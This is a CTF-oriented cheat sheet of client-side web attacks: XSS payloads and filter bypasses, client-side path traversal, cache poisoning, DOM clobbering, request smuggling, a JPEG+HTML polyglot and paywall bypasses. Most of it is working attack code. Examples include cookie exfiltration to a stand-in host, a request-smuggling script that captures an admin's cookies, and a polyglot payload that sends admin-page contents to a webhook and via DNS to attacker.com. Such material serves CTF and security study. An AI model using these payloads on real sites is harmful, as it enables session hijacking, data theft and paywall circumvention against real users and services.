# CTF Web - Client-Side Attacks

## Table of Contents
- [XSS Payloads](#xss-payloads)
  - [Basic](#basic)
  - [Cookie Exfiltration](#cookie-exfiltration)
  - [Filter Bypass](#filter-bypass)
  - [Hex/Unicode Bypass](#hexunicode-bypass)
- [DOMPurify Bypass via Trusted Backend Routes](#dompurify-bypass-via-trusted-backend-routes)
- [JavaScript String Replace Exploitation](#javascript-string-replace-exploitation)
- [Client-Side Path Traversal (CSPT)](#client-side-path-traversal-cspt)
- [Cache Poisoning](#cache-poisoning)
- [Hidden DOM Elements](#hidden-dom-elements)
- [React-Controlled Input Programmatic Filling](#react-controlled-input-programmatic-filling)
- [Magic Link + Redirect Chain XSS](#magic-link-redirect-chain-xss)
- [Content-Type via File Extension](#content-type-via-file-extension)
- [Shadow DOM XSS](#shadow-dom-xss)
- [DOM Clobbering + MIME Mismatch](#dom-clobbering-mime-mismatch)
- [HTTP Request Smuggling via Cache Proxy](#http-request-smuggling-via-cache-proxy)
- [CSS/JS Paywall Bypass](#cssjs-paywall-bypass)
- [JPEG+HTML Polyglot XSS (EHAX 2026)](#jpeghtml-polyglot-xss-ehax-2026)
- [JSFuck Decoding](#jsfuck-decoding)

---

## XSS Payloads

### Basic
```html
<script>alert(1)</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<body onload=alert(1)>
<input onfocus=alert(1) autofocus>
```

### Cookie Exfiltration
```html
<script>fetch('https://exfil.com/?c='+document.cookie)</script>
<img src=x onerror="fetch('https://exfil.com/?c='+document.cookie)">
```

### Filter Bypass
```html
<ScRiPt>alert(1)</ScRiPt>           <!-- Case mixing -->
<script>alert`1`</script>           <!-- Template literal -->
<img src=x onerror=alert&#40;1&#41;>  <!-- HTML entities -->
<svg/onload=alert(1)>               <!-- No space -->
```

### Hex/Unicode Bypass
- Hex encoding: `\x3cscript\x3e`
- HTML entities: `&#60;script&#62;`

---

## DOMPurify Bypass via Trusted Backend Routes

Frontend sanitizes before autosave, but backend trusts autosave — no sanitization.
Exploit: POST directly to `/api/autosave` with XSS payload.

---

## JavaScript String Replace Exploitation

`.replace()` special patterns: `$\`` = content BEFORE match, `$'` = content AFTER match
Payload: `<img src="abc$\`<img src=x onerror=alert(1)>">`

---

## Client-Side Path Traversal (CSPT)

Frontend JS uses URL param in fetch without validation:
```javascript
const profileId = urlParams.get("id");
fetch("/log/" + profileId, { method: "POST", body: JSON.stringify({...}) });
```
Exploit: `/user/profile?id=../admin/addAdmin` → fetches `/admin/addAdmin` with CSRF body

Parameter pollution: `/user/profile?id=1&id=../admin/addAdmin` (backend uses first, frontend uses last)

---

## Cache Poisoning

CDN/cache keys only on URL:
```python
requests.get(f"{TARGET}/search?query=harmless", data=f"query=<script>evil()</script>")
# All visitors to /search?query=harmless get XSS
```

---

## Hidden DOM Elements

Proof/flag in `display: none`, `visibility: hidden`, `opacity: 0`, or off-screen elements:
```javascript
document.querySelectorAll('[style*="display: none"], [hidden]')
  .forEach(el => console.log(el.id, el.textContent));

// Find all hidden content
document.querySelectorAll('*').forEach(el => {
  const s = getComputedStyle(el);
  if (s.display === 'none' || s.visibility === 'hidden' || s.opacity === '0')
    if (el.textContent.trim()) console.log(el.tagName, el.id, el.textContent.trim());
});
```

---

## React-Controlled Input Programmatic Filling

React ignores direct `.value` assignment. Use native setter + events:
```javascript
const input = document.querySelector('input[placeholder="SDG{...}"]');
const nativeSetter = Object.getOwnPropertyDescriptor(
  window.HTMLInputElement.prototype, 'value'
).set;
nativeSetter.call(input, 'desired_value');
input.dispatchEvent(new Event('input', { bubbles: true }));
input.dispatchEvent(new Event('change', { bubbles: true }));
```

Works for React, Vue, Angular. Essential for automated form filling via DevTools.

---

## Magic Link + Redirect Chain XSS
```javascript
// /magic/:token?redirect=/edit/<xss_post_id>
// Sets auth cookies, then redirects to attacker-controlled XSS page
```

---

## Content-Type via File Extension
```javascript
// @fastify/static determines Content-Type from extension
noteId = '<img src=x onerror="alert(1)">.html'
// Response: Content-Type: text/html → XSS
```

---

## Shadow DOM XSS

**Closed Shadow DOM exfiltration (Pragyan 2026):** Wrap `attachShadow` in a Proxy to capture shadow root references:
```javascript
var _r, _o = Element.prototype.attachShadow;
Element.prototype.attachShadow = new Proxy(_o, {
  apply: (t, a, b) => { _r = Reflect.apply(t, a, b); return _r; }
});
// After target script creates shadow DOM, _r contains the root
```

**Indirect eval scope escape:** `(0,eval)('code')` escapes `with(document)` scope restrictions.

**Payload smuggling via avatar URL:** Encode full JS payload in avatar URL after fixed prefix, extract with `avatar.slice(N)`:
```html
<svg/onload=(0,eval)('eval(avatar.slice(24))')>
```

**`</script>` injection (Shadow Fight 2):** Keyword filters often miss HTML structural tags. `</script>` closes existing script context, `<script src=//evil>` loads external script. External script reads flag from `document.scripts[].textContent`.

---

## DOM Clobbering + MIME Mismatch

**MIME type confusion (Pragyan 2026):** CDN/server checks for `.jpeg` but not `.jpg` → serves `.jpg` as `text/html` → HTML in JPEG polyglot executes as page.

**Form-based DOM clobbering:**
```html
<form id="config"><input name="canAdminVerify" value="1"></form>
<!-- Makes window.config.canAdminVerify truthy, bypassing JS checks -->
```

---

## HTTP Request Smuggling via Cache Proxy

**Cache proxy desync (Pragyan 2026):** When a caching TCP proxy returns cached responses without consuming request bodies, leftover bytes are parsed as the next request.

**Cookie theft pattern:**
1. Create cached resource (e.g., blog post)
2. Send request with cached URL + appended incomplete POST (large Content-Length, partial body)
3. Cache proxy returns cached response, doesn't consume POST body
4. Admin bot's next request bytes fill the POST body → stored on server
5. Read stored request to extract admin's cookies

```python
inner_req = (
    f"POST /create HTTP/1.1\r\n"
    f"Host: {HOST}\r\n"
    f"Cookie: session={user_session}\r\n"
    f"Content-Length: 256\r\n"  # Large, but only partial body sent
    f"\r\n"
    f"content=LEAK_"  # Victim's request completes this
)
outer_req = (
    f"GET /cached-page HTTP/1.1\r\n"
    f"Content-Length: {len(inner_req)}\r\n"
    f"\r\n"
).encode() + inner_req
```

---

## CSS/JS Paywall Bypass

**Pattern (Great Paywall, MetaCTF 2026):** Article content is fully present in the HTML but hidden behind a CSS/JS overlay (`position: fixed; z-index: 99999; backdrop-filter: blur(...)` with a "Subscribe" CTA).

**Quick solve:** `curl` the page — no CSS/JS rendering means the full article (and flag) are in the raw HTML.

```bash
curl -s https://target/article | grep -i "flag\|CTF{"
```

**Alternative approaches:**
- View page source in browser (Ctrl+U)
- Browser DevTools → delete the overlay element
- Disable JavaScript in browser settings
- `document.querySelector('#paywall-overlay').remove()` in console
- Googlebot user-agent: `curl -H "User-Agent: Googlebot" https://target/article`

**Key insight:** Many paywalls are client-side DOM overlays — the content is always in the HTML. The leetspeak hint "paywalls are just DOM" confirms this. Always try `curl` or view-source first before more complex approaches.

**Detection:** Look for `<div>` elements with `position: fixed`, high `z-index`, and `backdrop-filter: blur()` in the page source — these are overlay-based paywalls.

---

## JPEG+HTML Polyglot XSS (EHAX 2026)

**Pattern (Metadata Meyham):** File upload accepts JPEG, serves uploaded files with permissive MIME type. Admin bot visits reported files.

**Attack:** Create a JPEG+HTML polyglot — valid JPEG header followed by HTML/JS payload:
```python
from PIL import Image
import io

# Create minimal valid JPEG
img = Image.new('RGB', (1,1), color='red')
buf = io.BytesIO()
img.save(buf, 'JPEG', quality=1)
jpeg_data = buf.getvalue()

# HTML payload appended after JPEG data
html_payload = '''<!DOCTYPE html>
<html><body><script>
(async function(){
  // Fetch admin page content
  var r = await fetch("/admin");
  var t = await r.text();
  // Exfiltrate via self-upload (stays on same origin)
  var j = new Uint8Array([255,216,255,224,0,16,74,70,73,70,0,1,1,0,0,1,0,1,0,0,255,217]);
  var b = new Blob([j], {type:'image/jpeg'});
  var f = new FormData();
  f.append('file', b, 'FLAG_' + btoa(t).substring(0,100) + '.jpg');
  await fetch('/upload', {method:'POST', body:f});
  // Also try external webhook
  new Image().src = "https://webhook.site/YOUR_ID?d=" + encodeURIComponent(t.substring(0,500));
})();
</script></body></html>'''

polyglot = jpeg_data + b'\n' + html_payload.encode()
# Upload as .html with image/jpeg content type
```

**PoW bypass:** Many CTF report endpoints require SHA-256 proof-of-work:
```python
import hashlib
nonce = 0
while True:
    h = hashlib.sha256((challenge + str(nonce)).encode()).hexdigest()
    if h.startswith('0' * difficulty):
        break
    nonce += 1
```

**Exfiltration methods (ranked by reliability):**
1. **Self-upload:** Fetch `/admin`, upload result as filename → check `/files` for new uploads
2. **Webhook:** `fetch('https://webhook.site/ID?flag='+data)` — may be blocked by CSP
3. **DNS exfil:** `new Image().src = 'http://'+btoa(flag)+'.attacker.com'` — bypasses most CSP

**Key insight:** JPEG files are tolerant of trailing data. Browsers parse HTML from anywhere in the response when MIME allows it. The polyglot is simultaneously a valid JPEG and valid HTML.

---

## JSFuck Decoding

**Pattern (JShit, PascalCTF 2026):** Page source contains JSFuck (`[]()!+` only). Decode by removing trailing `()()` and calling `.toString()` in Node.js:
```javascript
const code = fs.readFileSync('jsfuck.js', 'utf8');
// Remove last () to get function object instead of executing
const func = eval(code.slice(0, -2));
console.log(func.toString());  // Reveals original code with hardcoded flag
```
